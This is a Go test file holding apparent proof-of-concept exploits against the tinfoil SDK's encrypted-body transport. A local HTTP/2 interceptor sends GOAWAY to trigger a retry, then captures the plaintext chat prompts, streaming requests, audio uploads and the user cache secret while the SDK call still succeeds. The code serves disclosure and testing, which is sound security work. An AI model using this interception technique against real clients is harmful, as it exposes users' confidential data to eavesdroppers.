package tinfoil

// Variant PoCs at the SDK level (local only, 127.0.0.1). Same composition as
// secureHTTPClient(..., TransportEHBP, baseURL, secret): ehbpHTTPClient ->
// recoveryTransport -> boundHTTPClient (user_cache_secret + host binding),
// driven by the real openai-go client over the real http.DefaultTransport.
// Only attestation is replaced by a stand-in that hands over the HPKE key.
//
// Trigger used here: HTTP/2 GOAWAY (graceful shutdown, NO_ERROR,
// last_stream_id=0) instead of RST_STREAM(REFUSED_STREAM). The retry happens
// on a NEW connection, so the attacker keys held ciphertext by the
// Ehbp-Encapsulated-Key header that the replay carries unchanged.

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/verify"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type vCap struct {
	conn    int
	stream  uint32
	headers map[string]string
	body    bytes.Buffer
}

type goawayAttacker struct {
	upstream string
	trigger  func(n int, c *vCap) bool // true => GOAWAY instead of relaying

	mu       sync.Mutex
	conns    int
	n        int
	captures []*vCap
	held     map[string][]byte
}

func (a *goawayAttacker) serveConn(t *testing.T, nc net.Conn) {
	defer nc.Close()
	a.mu.Lock()
	ci := a.conns
	a.conns++
	a.mu.Unlock()
	pre := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(nc, pre); err != nil || string(pre) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(nc, nc)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	streams := map[uint32]*vCap{}
	var lastGood uint32
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			c := &vCap{conn: ci, stream: f.StreamID, headers: map[string]string{}}
			for _, hf := range fields {
				c.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = c
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			c := streams[f.StreamID]
			if c == nil {
				continue
			}
			c.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		c := streams[ended]
		key := c.headers["ehbp-encapsulated-key"]
		a.mu.Lock()
		n := a.n
		a.n++
		a.captures = append(a.captures, c)
		a.mu.Unlock()
		if a.trigger(n, c) {
			a.mu.Lock()
			a.held[key] = append([]byte(nil), c.body.Bytes()...)
			a.mu.Unlock()
			fr.WriteGoAway(lastGood, http2.ErrCodeNo, nil) // graceful shutdown
			continue
		}
		body := c.body.Bytes()
		a.mu.Lock()
		if ct, ok := a.held[key]; ok {
			body = ct // forward the genuine ciphertext for this exchange
		}
		a.mu.Unlock()
		up, _ := http.NewRequest(c.headers[":method"], a.upstream+c.headers[":path"], bytes.NewReader(body))
		up.Header.Set("Ehbp-Encapsulated-Key", key)
		up.Header.Set("Content-Type", c.headers["content-type"])
		upResp, err := http.DefaultClient.Do(up)
		if err != nil {
			t.Errorf("upstream: %v", err)
			return
		}
		rb, _ := io.ReadAll(upResp.Body)
		upResp.Body.Close()
		hb.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: fmt.Sprint(upResp.StatusCode)})
		enc.WriteField(hpack.HeaderField{Name: "content-type", Value: upResp.Header.Get("Content-Type")})
		if nonce := upResp.Header.Get("Ehbp-Response-Nonce"); nonce != "" {
			enc.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: nonce})
		}
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hb.Bytes(), EndHeaders: true})
		fr.WriteData(ended, true, rb)
		lastGood = ended
	}
}

var (
	sdkOnce sync.Once
	sdkCert tls.Certificate
	sdkPool *x509.CertPool
)

func sdkSetup(t *testing.T) {
	sdkOnce.Do(func() {
		sdkCert, sdkPool = pocCert(t)
		// Trust the attacker's certificate (it is the proxy the user configured,
		// the enclave hostname's WebPKI-cert holder, or a TLS-terminating front
		// end). ForceAttemptHTTP2 on DefaultTransport offers h2 via ALPN.
		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{RootCAs: sdkPool, NextProtos: []string{"h2", "http/1.1"}}
	})
	t.Cleanup(http.DefaultTransport.(*http.Transport).CloseIdleConnections)
}

func sdkEnclave(t *testing.T, saw *string) (*ehbpidentity.Identity, *httptest.Server) {
	id, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(id.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		*saw = string(b)
		switch {
		case strings.HasSuffix(r.URL.Path, "/audio/transcriptions"):
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`{"text":"transcribed in the enclave"}`))
		case strings.Contains(string(b), `"stream":true`):
			w.Header().Set("Content-Type", "text/event-stream")
			w.Write([]byte("data: {\"id\":\"c1\",\"object\":\"chat.completion.chunk\",\"created\":1,\"model\":\"m\",\"choices\":[{\"index\":0,\"delta\":{\"role\":\"assistant\",\"content\":\"streamed from the enclave\"}}]}\n\ndata: [DONE]\n\n"))
		default:
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"hello from the enclave"}}]}`))
		}
	})))
	t.Cleanup(srv.Close)
	return id, srv
}

func sdkClient(t *testing.T, id *ehbpidentity.Identity, proxyURL string) openai.Client {
	verifier := transportVerifierFunc(func(build func(*verify.Verification) (http.RoundTripper, error), _ func(error) bool) (http.RoundTripper, error) {
		return build(&verify.Verification{CryptoMaterial: []document.CryptoMaterialItem{{
			ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: id.MarshalPublicKeyHex(),
		}}})
	})
	const enclaveHost = "enclave.example"
	hc, err := ehbpHTTPClient(verifier, enclaveHost, proxyURL)
	if err != nil {
		t.Fatal(err)
	}
	hc.Transport = &recoveryTransport{transport: hc.Transport}
	hc, err = boundHTTPClient(hc, enclaveHost, proxyURL, "victim-user-cache-secret-5f3a")
	if err != nil {
		t.Fatal(err)
	}
	return openai.NewClient(option.WithHTTPClient(hc), option.WithBaseURL(proxyURL+"/v1/"), option.WithAPIKey("tk_test"))
}

func startGoaway(t *testing.T, upstream string, trigger func(int, *vCap) bool) (*goawayAttacker, string) {
	a := &goawayAttacker{upstream: upstream, trigger: trigger, held: map[string][]byte{}}
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{sdkCert}, NextProtos: []string{"h2"}})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go a.serveConn(t, c)
		}
	}()
	return a, "https://" + ln.Addr().String()
}

func dump(t *testing.T, a *goawayAttacker, marker string) bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	leaked := false
	for i, c := range a.captures {
		plain := strings.Contains(c.body.String(), marker)
		leaked = leaked || plain
		b := c.body.String()
		if len(b) > 220 {
			b = b[:220] + "..."
		}
		t.Logf("  attacker capture %d: conn=%d stream=%d %s %s ct=%q x-tinfoil-enclave-url=%s key=%.16s.. plaintext=%v body=%q",
			i, c.conn, c.stream, c.headers[":method"], c.headers[":path"], c.headers["content-type"], c.headers["x-tinfoil-enclave-url"], c.headers["ehbp-encapsulated-key"], plain, b)
	}
	return leaked
}

func TestVariantSDK_GoAway_ChatCompletion(t *testing.T) {
	sdkSetup(t)
	var saw string
	id, enclave := sdkEnclave(t, &saw)
	a, proxyURL := startGoaway(t, enclave.URL, func(n int, c *vCap) bool { return n == 0 })
	oc := sdkClient(t, id, proxyURL)
	resp, err := oc.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("TOP-SECRET: patient Jane Roe, HIV positive")},
	})
	if err != nil {
		t.Fatalf("SDK call failed: %v", err)
	}
	t.Logf("SDK call succeeded: %q; enclave decrypted %q", resp.Choices[0].Message.Content, saw)
	if !dump(t, a, "HIV positive") {
		t.Fatal("no plaintext reached the attacker")
	}
	t.Log("VULNERABLE (GOAWAY trigger): attacker read plaintext prompt + user_cache_secret; SDK call succeeded")
}

func TestVariantSDK_GoAway_StreamingChat(t *testing.T) {
	sdkSetup(t)
	var saw string
	id, enclave := sdkEnclave(t, &saw)
	a, proxyURL := startGoaway(t, enclave.URL, func(n int, c *vCap) bool { return n == 0 })
	oc := sdkClient(t, id, proxyURL)
	stream := oc.Chat.Completions.NewStreaming(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("TOP-SECRET streaming: acquisition of ACME Corp")},
	})
	var got strings.Builder
	for stream.Next() {
		for _, ch := range stream.Current().Choices {
			got.WriteString(ch.Delta.Content)
		}
	}
	if err := stream.Err(); err != nil {
		t.Fatalf("stream failed: %v", err)
	}
	t.Logf("SDK streaming call succeeded: %q", got.String())
	if !dump(t, a, "acquisition of ACME Corp") {
		t.Fatal("no plaintext reached the attacker")
	}
	t.Log("VULNERABLE (GOAWAY trigger, streaming): attacker read plaintext prompt; SDK stream succeeded")
}

func TestVariantSDK_GoAway_AudioUpload(t *testing.T) {
	sdkSetup(t)
	var saw string
	id, enclave := sdkEnclave(t, &saw)
	a, proxyURL := startGoaway(t, enclave.URL, func(n int, c *vCap) bool { return n == 0 })
	oc := sdkClient(t, id, proxyURL)
	audio := []byte("RIFF....WAVEfmt CONFIDENTIAL-VOICE-MEMO: board votes to sell the company")
	resp, err := oc.Audio.Transcriptions.New(context.Background(), openai.AudioTranscriptionNewParams{
		File:  openai.File(bytes.NewReader(audio), "memo.wav", "audio/wav"),
		Model: "whisper-1",
	})
	if err != nil {
		t.Fatalf("SDK upload failed: %v", err)
	}
	t.Logf("SDK transcription call succeeded: %q", resp.Text)
	if !dump(t, a, "CONFIDENTIAL-VOICE-MEMO") {
		t.Fatal("no plaintext reached the attacker")
	}
	t.Log("VULNERABLE (GOAWAY trigger, multipart upload): attacker read the uploaded file in plaintext; SDK call succeeded")
}
